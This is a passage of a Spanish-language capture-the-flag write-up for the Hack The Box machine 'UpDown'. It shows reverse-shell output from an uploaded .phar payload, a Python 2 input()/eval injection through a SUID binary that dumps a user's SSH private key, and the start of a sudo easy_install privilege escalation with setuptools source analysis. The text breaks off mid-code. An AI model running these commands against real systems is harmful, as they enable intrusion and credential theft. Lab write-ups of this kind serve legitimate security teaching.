[*] Creating file: rce.phar
[*] Uploading file
[+] Executing payload

Open port 1234 to receive the shell (g.e nc -lvnp 1234)
Press ENTER to continue

[*] Searching file in http://dev.siteisup.htb/uploads/c6087c74c29b91be0ffd2edcabf58e2e/rce.phar:


────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:55304.
bash: cannot set terminal process group (908): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">www-data@updown:/var/www/dev/uploads/c6087c74c29b91be0ffd2edcabf58e2e$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">whoami
www-data
</span></pre></table></code></div></div><p>Con respecto a las malas prácticas que nos permitieron el acceso al servidor:</p><blockquote><p>No bloquear el acceso al directorio <code class="language-plaintext highlighter-rouge">.git</code></p><p>Para solucionarlo tendríamos que agregar a nuestro archivo <code class="language-plaintext highlighter-rouge">.htaccess</code> la línea <strong>RedirectMatch 404 /.git</strong></p></blockquote><blockquote><p>No sanitizar todas las extensiones de archivos peligrosos como <code class="language-plaintext highlighter-rouge">.phar</code></p></blockquote><blockquote><p>No deshabilitar todas las funciones que permitan <strong>Execución de Comandos</strong></p></blockquote><p>Como usuarios <code class="language-plaintext highlighter-rouge">www-data</code> enumeramos rutas/archivos del sistema al cuál tengamos permisos como grupo y eliminando rutas no interesantes encontramos lo siquiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/$</span><span class="w"> </span>find / <span class="nt">-group</span> 33 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"var|sys|proc"</span>
<span class="go">/home/developer/dev
/home/developer/dev/siteisup_test.py
/home/developer/dev/siteisup
</span></pre></table></code></div></div><p>Además notamos que el archivo <code class="language-plaintext highlighter-rouge">siteisup</code> tiene permisos <strong>SUID</strong>, lo cuál significa que podemos ejecutarlo como el propietario, en este caso el usuario <code class="language-plaintext highlighter-rouge">developer</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /home/developer/dev/
<span class="go">total 24
-rwsr-x--- 1 developer www-data 16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data   154 Jun 22 15:45 siteisup_test.py
</span></pre></table></code></div></div><p>Si inspeccionamos el archivo veremos que <code class="language-plaintext highlighter-rouge">siteisup</code> es un archivo executable, así que procedemos a examinarlo intentando leer cadenas de texto imprimibles en el archivo:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/home/developer/dev$</span><span class="w"> </span>file siteisup
<span class="go">siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped
</span><span class="gp">www-data@updown:/home/developer/dev$</span><span class="w"> </span>strings siteisup
<span class="go">/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setresgid
setresuid
system
getegid
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py   &lt;---- Call!
</span><span class="c">...
</span></pre></table></code></div></div><p>Observamos que se llama al otro archivo <code class="language-plaintext highlighter-rouge">siteisup_test.py</code> que tenemos en el directorio, además que lo está executando con <code class="language-plaintext highlighter-rouge">python</code> lo cuál nos hace pensar que está usando una version no tan reciente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/home/developer/dev$</span><span class="w"> </span>/usr/bin/python
<span class="go">Python 2.7.18 (default, Mar  8 2021, 13:02:45)
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span>
<span class="gp">www-data@updown:/home/developer/dev$</span><span class="w"> </span>/usr/bin/python <span class="nt">--version</span>
<span class="go">Python 2.7.18
</span></pre></table></code></div></div><p>Estabamos en lo cierto, y además buscando en internet encontramos que estamos frente a la última version de <code class="language-plaintext highlighter-rouge">python2</code>:</p><p><img data-src="/assets/img/htb/writeups/updown/python2_last_release.png" alt="python2-last-release" class="shadow" data-proofer-ignore></p><p>Procediendo a examinar el archivo <code class="language-plaintext highlighter-rouge">siteisup_test.py</code> notamos que el código solo recibe una dirección url como <strong>input</strong> y luego realiza una petición <strong>GET</strong> para comprobar si es sitio está activo o no (la misma funcionalidad en el transcurso de la máquina):</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/home/developer/dev$</span><span class="w"> </span><span class="nb">cat </span>siteisup_test.py<span class="p">;</span> <span class="nb">echo</span>
<span class="go">import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
</span></pre></table></code></div></div><p>Ya que no soy una persona tan experimentada, no deduje como explotar de manera directa esto, pero al empezar a testear el programa obtuve una respuesta que me llamó la atención:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/home/developer/dev$</span><span class="w"> </span>python siteisup_test.py
<span class="go">Enter URL here:test
Traceback (most recent call last):
</span><span class="gp">  File "siteisup_test.py", line 3, in &lt;module&gt;</span><span class="w">
</span><span class="go">    url = input("Enter URL here:")
</span><span class="gp">  File "&lt;string&gt;</span><span class="s2">", line 1, in &lt;module&gt;
</span><span class="go">NameError: name 'test' is not defined  &lt;----- ???
</span></pre></table></code></div></div><blockquote><p>Vulnerability Assessment</p></blockquote><p>Si programas en <code class="language-plaintext highlighter-rouge">python</code> sabrás que este mensaje suele ocurrir cuando <strong>llamas a una variable que no ha sido declarada</strong>. Por ello, al investigar en internet sobre posibles vulnerabilidades con la función <strong>input()</strong> en <code class="language-plaintext highlighter-rouge">python2.7.18</code>, encontré este <a href="https://medium.com/@abdelazimmohmmed/python-input-vulnerability-30b0bfea22c9">Blog</a> lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="c">############################## python2 ###########################################</span>
<span class="go">Help on built-in function input in module __builtin__:

input(...)
</span><span class="gp">    input([prompt]) -&gt;</span><span class="w"> </span>value
<span class="go">    
    Equivalent to eval(raw_input(prompt)).
(END)
───────────────────────────────────────────────────────────────────────────────────
</span><span class="gp">#</span><span class="c">############################## python3 ###########################################</span>
<span class="go">Help on built-in function input in module builtins:

input(prompt=None, /)
    Read a string from standard input.  The trailing newline is stripped.
    
    The prompt string, if given, is printed to standard output without a
    trailing newline before reading input.
    
    If the user hits EOF (*nix: Ctrl-D, Windows: Ctrl-Z+Return), raise EOFError.
    On *nix systems, readline is used if available.
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Lo anterior es solo una comparación sobre los cambios actuales respecto a la misma función</p></div></blockquote><p>En <code class="language-plaintext highlighter-rouge">python2</code> observamos que la llamada a esta función es equivalente a la función <strong>eval()</strong>, lo cuál consiste en lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">Help on built-in function eval in module __builtin__:

eval(...)
</span><span class="gp">    eval(source[, globals[, locals]]) -&gt;</span><span class="w"> </span>value
<span class="go">    
    Evaluate the source in the context of globals and locals.
    The source may be a string representing a Python expression
    or a code object as returned by compile().
    The globals must be a dictionary and locals can be any mapping,
    defaulting to the current globals and locals.
    If only globals is given, locals defaults to it.
</span></pre></table></code></div></div><p>Es una función que ya hemos visto antes pero en el lenguaje <code class="language-plaintext highlighter-rouge">php</code>, lo cuál como dice en su descripción, <strong>evalua una expresión en python (respecto al código mismo, ya sea al usar variables o funciones declaradas antes) pasada como cadena de texto y si es válida la ejecutará</strong></p><p>Con está información podemos hacer las siguientes pruebas en <code class="language-plaintext highlighter-rouge">python2</code> y <code class="language-plaintext highlighter-rouge">python3</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="c">############ python2 ################</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> input<span class="o">()</span>
<span class="go">__import__("os").system("whoami")
root
0
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> RCE!
<span class="go">──────────────────────────────────────
</span><span class="gp">#</span><span class="c">############ python3 ################</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> input<span class="o">()</span>
<span class="go">__import__("os").system("whoami")
'__import__("os").system("whoami")'
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> Safe
</pre></table></code></div></div><p>Con estas pruebas concluimos que tenemos <strong>Execución Remota de Comandos</strong> en el executable <code class="language-plaintext highlighter-rouge">siteisup</code>:</p><blockquote><p>Exploitation</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/home/developer/dev$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'__import__("os").system("cat /home/developer/.ssh/id_rsa")'</span> | ./siteisup 2&gt;/dev/null
<span class="go">Welcome to 'siteisup.htb' application

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
srrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+q
a+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu
</span><span class="c">...
</span></pre></table></code></div></div><p>Ahora solo extraemos la llave privada del usuario <code class="language-plaintext highlighter-rouge">developer</code>, nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code> y conseguimos la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="gp">www-data@updown:/tmp$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'__import__("os").system("cat /home/developer/.ssh/id_rsa")'</span> | /home/developer/dev/siteisup 2&gt;/dev/null | <span class="nb">sed</span> <span class="s1">'39d'</span> <span class="o">&gt;</span> id_rsa_developer
<span class="gp">www-data@updown:/tmp$</span><span class="w"> </span><span class="nb">chmod </span>600 id_rsa_developer 
<span class="gp">www-data@updown:/tmp$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa_developer developer@localhost <span class="nt">-q</span>
<span class="go">The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:npwXkHj+pLo3LaYR66HNCKEpU/vUoTG03FL41SMlIh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 25 01:01:48 UTC 2022

  System load:  0.0               Processes:             243
  Usage of /:   49.9% of 2.84GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.11.177
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Oct 25 00:59:31 2022 from 127.0.0.1
</span><span class="gp">developer@updown:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> + 2&gt;/dev/null
<span class="go">-rw-r----- 1 root developer 33 Oct 24 16:54 /home/developer/user.txt
</span></pre></table></code></div></div><p>Con respecto a las malas prácticas que nos permitieron el acceso al servidor:</p><blockquote><p>Usar versiones no actualizadas de los programas que usas al implementar una aplicación + permisos <strong>SUID</strong></p></blockquote><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>En el proceso de la enumeración básica para el sistema encontramos que podemos ejecutar un binario como el usaurio <code class="language-plaintext highlighter-rouge">root</code> sin porporcionar una contraseña:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">developer@updown:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Al parecer es un binario conocido y explotable al instante: <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">https://gtfobins.github.io/gtfobins/easy_install/#sudo</a></p></div></blockquote><p>Sin embargo, debemos entender como funciona por detrás para saber que es lo que hace, vamos a ello:</p><blockquote><p>¿ Qué es <code class="language-plaintext highlighter-rouge">easy_install</code> ?</p></blockquote><p>Bueno, easy_install es un módulo de <code class="language-plaintext highlighter-rouge">python</code> que nos permite descargar, contruir, instalar y administrar paquetes del lenguaje. Es una herramienta que hoy en día está obsoleta y ha sido remplazada por el famoso <code class="language-plaintext highlighter-rouge">pip</code> que todos conocemos</p><blockquote><p>¿ Qué es un <code class="language-plaintext highlighter-rouge">paquete</code> en python ?</p></blockquote><p>En pocas palabras, un paquete es un módulo que tiene más módulos dentro y así sucesivamente. Con la siguiente estructura:</p><pre><code class="language-test">a_package
   __init__.py
   module_a.py
   a_sub_package
     __init__.py
     module_b.py
</code></pre><blockquote class="prompt-info"><div><p>Aquí tienes más información sobre <strong>paquetes en python</strong>: <a href="https://python-packaging-tutorial.readthedocs.io/en/latest/setup_py.html">https://python-packaging-tutorial.readthedocs.io/en/latest/setup_py.html</a></p></div></blockquote><blockquote><p>Instalación de un paquete</p></blockquote><p>Un paquete está estructurado por varios archivos, pero en esta ocasión nos centraremos en el archivo <code class="language-plaintext highlighter-rouge">setup.py</code>, él cuál es un <strong>script en python encargado de construir e instalar</strong> el paquete</p><p>Entonces:</p><ol><li>Tenemos una aplicación para construir e instalar paquetes<li>Sabemos que al instalar un paquete se buscará el script <code class="language-plaintext highlighter-rouge">setup.py</code> y se ejecutará</ol><p>Pero, <strong>¿ Por qué ocurre esto ?</strong></p><blockquote><p>Análisis de código</p></blockquote><p>Primero vemos el código del programa <code class="language-plaintext highlighter-rouge">easy_install</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">developer@updown:~$</span><span class="w"> </span><span class="nb">cat</span> /usr/local/bin/easy_install
<span class="gp">#</span><span class="o">!</span>/usr/bin/python
<span class="gp">#</span><span class="w"> </span>-<span class="k">*</span>- coding: utf-8 -<span class="k">*</span>-
<span class="go">import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
</span><span class="gp">    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$</span><span class="s1">', '', sys.argv[0])
</span><span class="go">    sys.exit(main())
</span></pre></table></code></div></div><p>Observamos que como flujo principal se aplica un filtro y luego se importa la función <code class="language-plaintext highlighter-rouge">main</code> de <code class="language-plaintext highlighter-rouge">setuptools.command.easy_install</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">developer@updown:~$</span><span class="w"> </span>find / <span class="nt">-name</span> easy_install.py 2&gt;/dev/null
<span class="go">/usr/lib/python3/dist-packages/easy_install.py
/usr/lib/python3/dist-packages/setuptools/command/easy_install.py
/usr/local/lib/python2.7/dist-packages/easy_install.py
/usr/local/lib/python2.7/dist-packages/setuptools/command/easy_install.py   &lt;--- This!
</span></pre></table></code></div></div><p>En la función main se realiza todo el proceso de la instalación del paquete (son muchas funciones y no entraremos en detalle) y llegamos a está función:</p><blockquote><p>/usr/local/lib/python2.7/dist-packages/setuptools/command/easy_install.py</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="k">def</span> <span class="nf">run_setup</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">setup_script</span><span class="p">,</span> <span class="n">setup_base</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s">'distutils.command.bdist_egg'</span><span class="p">,</span> <span class="n">bdist_egg</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">modules</span><span class="p">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s">'distutils.command.egg_info'</span><span class="p">,</span> <span class="n">egg_info</span><span class="p">)</span>

        <span class="n">args</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">verbose</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
            <span class="n">v</span> <span class="o">=</span> <span class="s">'v'</span> <span class="o">*</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">verbose</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">args</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'-'</span> <span class="o">+</span> <span class="n">v</span><span class="p">)</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">verbose</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
            <span class="n">args</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'-q'</span><span class="p">)</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">dry_run</span><span class="p">:</span>
            <span class="n">args</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'-n'</span><span class="p">)</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span>
            <span class="s">"Running %s %s"</span><span class="p">,</span> <span class="n">setup_script</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">setup_base</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:],</span> <span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
        <span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">run_setup</span><span class="p">(</span><span class="n">setup_script</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="c1"># &lt;--- This call!
</span>        <span class="k">except</span> <span class="nb">SystemExit</span> <span class="k">as</span> <span class="n">v</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">DistutilsError</span><span class="p">(</span><span class="s">"Setup script exited with %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">v</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],))</span>
<span class="p">...</span>
</pre></table></code></div></div><p>Se llama a la función <code class="language-plaintext highlighter-rouge">run_setup()</code> la cuál es importada de <code class="language-plaintext highlighter-rouge">setuptools.sandbox</code> (lo puedes ver en las primeras lineas del código)</p><blockquote><p>/usr/local/lib/python2.7/dist-packages/setuptools/sandbox.py</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="k">def</span> <span class="nf">run_setup</span><span class="p">(</span><span class="n">setup_script</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
    <span class="s">"""Run a distutils setup script, sandboxed in its directory"""</span>
    <span class="n">setup_dir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">setup_script</span><span class="p">))</span>
    <span class="k">with</span> <span class="n">setup_context</span><span class="p">(</span><span class="n">setup_dir</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[:]</span> <span class="o">=</span> <span class="p">[</span><span class="n">setup_script</span><span class="p">]</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">setup_dir</span><span class="p">)</span>
            <span class="c1"># reset to include setup dir, w/clean callback list
</span>            <span class="n">working_set</span><span class="p">.</span><span class="n">__init__</span><span class="p">()</span>
            <span class="n">working_set</span><span class="p">.</span><span class="n">callbacks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="k">lambda</span> <span class="n">dist</span><span class="p">:</span> <span class="n">dist</span><span class="p">.</span><span class="n">activate</span><span class="p">())</span>

            <span class="c1"># __file__ should be a byte string on Python 2 (#712)
</span>            <span class="n">dunder_file</span> <span class="o">=</span> <span class="p">(</span>
                <span class="n">setup_script</span>
                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">setup_script</span><span class="p">,</span> <span class="nb">str</span><span class="p">)</span> <span class="k">else</span>
                <span class="n">setup_script</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">getfilesystemencoding</span><span class="p">())</span>
            <span class="p">)</span>

            <span class="k">with</span> <span class="n">DirectorySandbox</span><span class="p">(</span><span class="n">setup_dir</span><span class="p">):</span>
                <span class="n">ns</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">__file__</span><span class="o">=</span><span class="n">dunder_file</span><span class="p">,</span> <span class="n">__name__</span><span class="o">=</span><span class="s">'__main__'</span><span class="p">)</span>
                <span class="n">_execfile</span><span class="p">(</span><span class="n">setup_script</span><span class="p">,</span> <span class="n">ns</span><span class="p">)</span> <span class="c1"># &lt;--- This call!
</span>        <span class="k">except</span> <span class="nb">SystemExit</span> <span class="k">as</span> <span class="n">v</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">v</span><span class="p">.</span><span class="n">args</span> <span class="ow">and</span> <span class="n">v</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
                <span class="k">raise</span>
            <span class="c1"># Normal exit, just return
</span><span class="p">...</span>
</pre></table></code></div></div><p>Luego llama a la función <code class="language-plaintext highlighter-rouge">_execfile</code> del mismo archivo:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">_execfile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">globals</span><span class="p">,</span> <span class="nb">locals</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="s">"""
    Python 3 implementation of execfile.
    """</span>
    <span class="n">mode</span> <span class="o">=</span> <span class="s">'rb'</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span> <span class="k">as</span> <span class="n">stream</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">if</span> <span class="nb">locals</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="nb">locals</span> <span class="o">=</span> <span class="nb">globals</span>
